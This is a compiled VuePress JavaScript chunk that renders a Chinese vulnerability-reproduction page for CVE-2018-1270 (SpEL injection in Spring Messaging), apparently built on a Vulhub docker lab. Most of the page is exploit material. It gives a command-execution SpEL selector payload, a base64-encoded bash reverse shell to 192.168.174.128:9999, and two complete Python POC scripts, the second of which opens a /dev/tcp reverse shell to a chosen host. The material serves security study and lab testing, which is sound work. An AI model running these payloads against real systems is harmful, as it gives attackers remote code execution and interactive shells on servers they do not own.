import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),k=n("p",null,"spring messaging 为 spring 框架提供消息支持，其上层协议是 STOMP，底层通信基于 SockJS，",-1),r=n("p",null,[s("在 spring messaging 中，其允许客户端订阅消息，并使用 selector 过滤消息。selector 用 SpEL 表达式编写，并使用 "),n("code",null,"StandardEvaluationContext"),s(" 解析，造成命令执行漏洞。")],-1),d=n("p",null,"参考链接：",-1),v={href:"https://pivotal.io/security/cve-2018-1270",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/2252",target:"_blank",rel:"noopener noreferrer"},b={href:"https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/CaledoniaProject/CVE-2018-1270",target:"_blank",rel:"noopener noreferrer"},h=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080</code> 即可看到一个 Web 页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>网上大部分文章都说 spring messaging 是基于 websocket 通信，其实不然。spring messaging 是基于 sockjs（可以理解为一个通信协议），而 sockjs 适配多种浏览器：现代浏览器中使用 websocket 通信，老式浏览器中使用 ajax 通信。</p><p>连接后端服务器的流程，可以理解为：</p>`,7),f={href:"http://jmesnil.net/stomp-websocket/doc/",target:"_blank",rel:"noopener noreferrer"},_={href:"https://github.com/sockjs/sockjs-client",target:"_blank",rel:"noopener noreferrer"},y=n("p",null,"所以我们可以使用 http 来复现漏洞，称之为“降维打击”。",-1),w={href:"https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py",target:"_blank",rel:"noopener noreferrer"},j=p(`<ol><li>基础地址，在 vulhub 中为 <code>http://your-ip:8080/gs-guide-websocket</code></li><li>待执行的 SpEL 表达式，如 <code>T(java.lang.Runtime).getRuntime().exec(&#39;touch /tmp/success&#39;)</code></li><li>某一个订阅的地址，如 vulhub 中为：<code>/topic/greetings</code></li><li>如何触发这个订阅，即如何让后端向这个订阅发送消息。在 vulhub 中，我们向 <code>/app/hello</code> 发送一个包含 name 的 json，即可触发这个事件。当然在实战中就不同了，所以这个 poc 并不具有通用性。</li></ol><p>根据你自己的需求修改 POC。如果是 vulhub 环境，你只需修改 1 中的 url 即可。</p><p>修改 2 中的命令为 <code>touch /tmp/awesome_poc</code>，执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011513442.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>命令执行成功，文件 <code>awesome_poc</code> 被成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011514030.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>尝试反弹 shell，构造命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>T(java.lang.Runtime).getRuntime().exec(&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听 9999 端口，成功接收反弹 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011516380.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    letters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
    <span class="token keyword">return</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>letters<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>base <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>random_str<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span>
        self<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>
            <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#39;</span>
        <span class="token punctuation">}</span>
        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>base<span class="token punctuation">}</span></span><span class="token string">/htmlfile?c=_jp.vulhub&#39;</span></span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">[</span>command<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;\\n&#39;</span><span class="token punctuation">]</span>

        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>v<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&#39;\\n\\n&#39;</span><span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&#39;\\x00&#39;</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>base<span class="token punctuation">}</span></span><span class="token string">/xhr_send?t=</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>t<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">204</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;send &#39;</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">&#39; data error.&quot;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;send &#39;</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">&#39; data success.&quot;</span></span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">&#39;http://your-ip:8080/gs-guide-websocket&#39;</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;connect&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;accept-version&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1.1,1.0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;heart-beat&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;10000,10000&#39;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;subscribe&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;selector&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;T(java.lang.Runtime).getRuntime().exec(&#39;touch /tmp/success&#39;)&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sub-0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;destination&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/topic/greetings&#39;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;vulhub&#39;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;send&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;content-length&#39;</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">&#39;destination&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/app/hello&#39;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>改动后反弹 shell poc：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> asyncio<span class="token punctuation">.</span>constants <span class="token keyword">import</span> LOG_THRESHOLD_FOR_CONNLOST_WRITES
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">import</span> base64

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    letters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
    <span class="token keyword">return</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>letters<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>base <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>random_str<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span>
        self<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>
            <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#39;</span>
        <span class="token punctuation">}</span>
        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>base<span class="token punctuation">}</span></span><span class="token string">/htmlfile?c=_jp.vulhub&#39;</span></span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">[</span>command<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;\\n&#39;</span><span class="token punctuation">]</span>

        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>v<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&#39;\\n\\n&#39;</span><span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&#39;\\x00&#39;</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>base<span class="token punctuation">}</span></span><span class="token string">/xhr_send?t=</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>t<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">204</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;send &#39;</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">&#39; data error.&quot;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;send &#39;</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">&#39; data success.&quot;</span></span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    sockjs<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;connect&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;accept-version&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1.1,1.0&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;heart-beat&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;10000,10000&#39;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;subscribe&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;selector&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;T(java.lang.Runtime).getRuntime().exec(&#39;bash -c {echo,&quot;</span> <span class="token operator">+</span> command<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;}|{base64,-d}|{bash,-i}&#39;)&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sub-0&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;destination&#39;</span><span class="token punctuation">:</span> subscribe_dest
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;vulhub&#39;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;send&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;content-length&#39;</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;destination&#39;</span><span class="token punctuation">:</span> send_dest
    <span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">&#39;http://1:8080/gs-guide-websocket&#39;</span>
    subscribe_dest <span class="token operator">=</span> <span class="token string">&#39;/topic/greetings&#39;</span>
    send_dest <span class="token operator">=</span> <span class="token string">&#39;/app/hello&#39;</span>
    lhost <span class="token operator">=</span> <span class="token string">&#39;127.0.0.1&#39;</span>
    lport <span class="token operator">=</span> <span class="token string">&#39;9999&#39;</span>
    command <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">&#39;bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>lhost<span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14);function x(S,T){const a=o("ExternalLinkIcon");return 